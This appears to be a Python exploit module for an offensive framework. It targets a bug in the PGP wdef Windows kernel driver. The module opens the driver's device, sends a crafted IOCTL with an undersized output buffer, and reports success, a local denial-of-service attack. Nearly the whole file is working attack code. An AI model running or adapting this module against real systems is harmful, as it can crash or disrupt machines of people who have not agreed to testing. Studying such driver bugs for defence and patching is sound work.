#! /usr/bin/env python

# trigger for PGP wdef ioctl bug

import sys
if '.' not in sys.path: 
    sys.path.append('.')

from exploitutils import *
from ExploitTypes.localexploit import LocalExploit

NAME                    = 'PGP wdef IOCTL'
DESCRIPTION             = 'PGP wdef IOCTL bug'
VERSION                 = '1.0'
PROPERTY                = {}
PROPERTY['TYPE']        = 'DoS'
PROPERTY['SITE']        = 'Local'
PROPERTY['ARCH']        = [['Windows']]
DOCUMENTATION           = {}
DOCUMENTATION['Notes']  = ''

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name = NAME
        self.node = None

    def pgpwdef_ioctl(self):
        vars = {}

        vars['GENERIC_READ']    = 0x80000000
        vars['GENERIC_WRITE']   = 0x40000000
        vars['OPEN_EXISTING']   = 0x3
        vars['ioctl_code']      = 0x80022044
        vars['in_buffer']       = "AAAABBBBCCCCDDDD"
        vars['in_buffer_len']   = len(vars['in_buffer'])
        vars['device_name']     = '\\\\.\\PGPwdef'
        
        code = """
        #import "remote", "kernel32.dll|CreateFileA" as "CreateFileA"
        #import "remote", "kernel32.dll|CloseHandle" as "CloseHandle"
        #import "remote", "kernel32.dll|DeviceIoControl" as "DeviceIoControl"
        
        #import "local", "sendint" as "sendint"
        
        #import "int", "GENERIC_READ" as "GENERIC_READ"
        #import "int", "GENERIC_WRITE" as "GENERIC_WRITE"
        #import "int", "OPEN_EXISTING" as "OPEN_EXISTING"
        #import "int", "ioctl_code" as "ioctl_code"
        #import "string", "in_buffer" as "in_buffer"
        #import "int", "in_buffer_len" as "in_buffer_len"
        #import "string", "device_name" as "device_name"

        void main() 
        {   
            char out_buf[16];
            int driver_handle;
            int bytes_returned;
            int ret;
            
            driver_handle = CreateFileA(device_name, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
            if(driver_handle == 0)
            {
                sendint(0);
                return;
            }
            // bug triggers on small outbuf len
            ret = DeviceIoControl(driver_handle, ioctl_code, in_buffer, in_buffer_len, out_buf, 16, &bytes_returned, 0);
            CloseHandle(driver_handle);
            sendint(ret);
            
            return;
        }
        """
        return self.node.shell.runCode(code, vars)

    def getargs(self):
        self.node = self.argsDict['passednodes'][0]            
        return
    
    def run(self):
        self.getargs()
        if self.node.nodetype.upper() not in ['WIN32NODE']:
            print "[-] Not a win32Node"
            return 0
        # go for it
        ret = self.pgpwdef_ioctl()
        if ret:
            print "[+] Succeeded (DeviceIoControl: %.8X)" % ret
        else:
            print "[-] Failed (exit status: %.8X)" % ret
        return 0
    
if __name__ == '__main__':
    print "[+] This module can not be run from the commandline"
